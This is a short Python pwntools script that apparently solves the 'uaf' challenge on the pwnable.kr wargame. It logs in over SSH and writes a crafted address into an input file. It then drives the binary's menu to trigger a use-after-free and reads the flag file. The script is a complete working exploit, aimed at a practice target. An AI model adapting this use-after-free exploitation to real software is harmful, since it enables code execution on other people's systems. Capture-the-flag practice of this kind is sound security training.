#!/usr/bin/python3
from pwn import *
import random
import string


def get_random_string(length):
    # Random string with the combination of lower and upper case
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


NAME = 'uaf'
session = ssh(host='pwnable.kr', user=NAME, port=2222, password='guest')
io = session.run('/bin/sh', env={"PS1": ""})
dir_name = get_random_string(16)

io.sendline(f'mkdir /tmp/{dir_name}')
io.sendline(f'cd /tmp/{dir_name}')
io.sendline('printf \'\x68\x15\x40\x00\x00\x00\x00\x00\' > input.txt')
io.sendline('~/uaf 24 input.txt')
sleep(1)

io.sendline('3\n2\n2\n1')
io.recvrepeat(1)

io.sendline('cat ~/flag')
print('flag:', io.recvrepeat(1).decode())
